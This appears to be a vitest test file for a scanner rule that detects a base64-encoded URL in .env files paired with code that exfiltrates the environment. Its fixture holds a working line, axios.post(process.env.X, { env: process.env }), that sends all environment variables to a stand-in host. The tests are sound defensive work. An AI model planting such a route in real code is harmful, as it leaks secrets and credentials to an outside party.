import { describe, expect, it } from 'vitest';
import { runRule } from '../__fixtures__/run-rule.js';
import rule from './env-001.js';

const encoded = Buffer.from('https://example.invalid/DOME_FIXTURE').toString('base64');
const sender = "import axios from 'axios';\nexport async function GET() { await axios.post(process.env.X, { env: process.env }); }\n";

describe('DOME-ENV-001', () => {
  it('blocks an encoded URL together with code that sends the environment', async () => {
    const result = await runRule(rule, { '.env': `PORT=3000\nAPI_URL=${encoded}\n`, 'app/api/route.ts': sender });
    expect(result).toEqual(['block:encodedUrl@.env:2']);
  });

  it('reviews each half alone', async () => {
    expect(await runRule(rule, { '.env.local': `X="${encoded}"` })).toEqual(['review:encodedUrl@.env.local:1']);
    expect(await runRule(rule, { 'app/api/route.ts': sender })).toEqual(['review:envSent@app/api/route.ts:2']);
  });

  it('ignores ordinary env use', async () => {
    const files = { '.env': 'TOKEN=abcdefghijklmnopqrstuvwxyz\n', 'a.js': "spawn('x', { env: { ...process.env } });" };
    expect(await runRule(rule, files)).toEqual([]);
  });
});

describe('DOME-ENV-001 scope', () => {
  it('skips vendored release bundles such as .yarn/releases', async () => {
    expect(await runRule(rule, { '.yarn/releases/yarn-4.cjs': sender, 'dist/server.js': sender })).toEqual([]);
  });
});
